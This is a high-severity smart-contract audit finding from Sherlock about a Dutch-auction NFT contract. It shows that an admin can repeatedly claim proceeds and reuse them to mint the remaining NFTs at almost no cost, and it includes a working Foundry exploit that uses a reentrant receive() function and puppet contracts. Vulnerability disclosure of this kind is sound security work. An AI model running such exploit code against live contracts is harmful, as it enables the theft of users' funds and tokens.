# [H] The restricted admin can steal all of the NFTs at no cost

## Summary
Severity: High
Reporter: OxZ00mer
Source: https://github.com/sherlock-audit/2023-07-beam-auction/blob/main/dutch-nft/src/MeritDutchAuction.sol#L128
Type: audit-issue

## Details
# The restricted admin can steal all of the NFTs at no cost

## Summary
The admin can mint all of the NFTs to themselves at no cost by calling the mint function after claiming the proceeds.

## Vulnerability Detail

https://github.com/sherlock-audit/2023-07-beam-auction/blob/main/dutch-nft/src/MeritDutchAuction.sol#L128
https://github.com/sherlock-audit/2023-07-beam-auction/blob/main/dutch-nft/src/MeritDutchAuction.sol#L172

The restricted admin account can withdraw the proceeds of the auction contract. This leads to two main problems:

1. Any funds the admin spends on NFTs now they will gain back afterward.
2. The fact that the admin can withdraw the proceeds leads to them being able to mint all of the NFTs left to be minted in the contract at once with almost no cost whatsoever other than the gas, given that at least one has been bought.

## Impact
The admin can steal all of the NFTs at only the cost of gas.

## Code Snippet
The following is a working PoC written in Foundry:

```solidity
MaliciousAdmin.sol

// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "../src/MeritDutchAuction.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721.sol";


contract MaliciousAdmin {

    uint256 constant public TOKENS_TO_STEAL = 100;
    uint256 constant public TOKENS_PER_ADDRESS = 4;

    MeritDutchAuction public auction;
    uint256 depth;
    MaliciousPuppet public puppet;

    constructor() {}

    function setAuction(address _auction) public {
        auction = MeritDutchAuction(_auction);
    }

    function claimProceeds() external {
        auction.claimProceeds();
    }

    receive() external payable {

        if (auction.minted() > TOKENS_TO_STEAL) return;

        if (address(puppet) != address(0) && puppet.depth() < TOKENS_PER_ADDRESS) {
            puppet.mint{value: msg.value}();
            if (auction.minted() > TOKENS_TO_STEAL) return;
        }

        depth++;

        if (depth > TOKENS_PER_ADDRESS) {
                puppet = new MaliciousPuppet(address(this), address(auction));
                puppet.mint{value: msg.value}();
        }

        if (auction.minted() > TOKENS_TO_STEAL) return;

        auction.mint{value: 1e18}(1);

        auction.claimProceeds();
    }

}

contract MaliciousPuppet {

    MaliciousAdmin immutable master;
    MeritDutchAuction immutable auction;
    IERC721 public nft;
    uint public depth;

    constructor(address _master, address _auction) {
        master = MaliciousAdmin(payable(_master));
        auction = MeritDutchAuction(_auction);
        nft = IERC721(auction.nft());
    }

    function mint() public payable {
        depth += 1;
        auction.mint{value: msg.value}(1);
        nft.transferFrom(address(this), address(master), auction.minted());
        master.claimProceeds();
    }

}
```

```solidity
Test.t.sol

    function testAdminStealAllNFTs() public {
        console.log("balance of owner before:", nft.balanceOf(owner));

        vm.startPrank(wallet1);
        vm.warp(startTime);
        // Buy 1 NFT from an innocent user
        auction.mint{value: 1e18}(1);
        vm.stopPrank();
        vm.startPrank(owner);

        auction.claimProceeds();

        console.log("balance of owner after:", nft.balanceOf(owner));
    }
```

## Tool used

Manual Review, Foundry

## Recommendation
Consider implementing a system that will allow the admin to claim the proceeds after all of the NFTs have already been minted. Consider adding a mechanism that checks whether the NFTs got bought out in the same block and revert if so. The latter is to prevent a potential vector including the admin taking a flash loan.
